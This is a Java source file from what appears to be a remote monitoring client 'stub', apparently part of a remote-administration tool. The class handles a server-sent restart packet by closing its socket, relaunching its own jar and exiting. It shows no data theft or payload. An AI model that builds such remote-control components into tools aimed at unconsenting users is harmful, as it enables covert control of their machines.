package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
import me.jershdervis.monitorj.stub.util.ExecutionUtil;

import java.io.IOException;
import java.net.URISyntaxException;

/**
 * Created by Josh on 21/06/2015.
 */
public class RestartClientApplicationTask extends PacketTask {

    public RestartClientApplicationTask() {
        super(Packets.RESTART_CLIENT_APPLICATION.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        try {
            if(ClientSystemUtil.getCurrentRunningJar().getAbsolutePath().toLowerCase().endsWith(".jar")) {
                client.getServerSocketConnection().close();
                ExecutionUtil.executeJarFile(ClientSystemUtil.getCurrentRunningJar());
                System.exit(0);
            }
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }
}
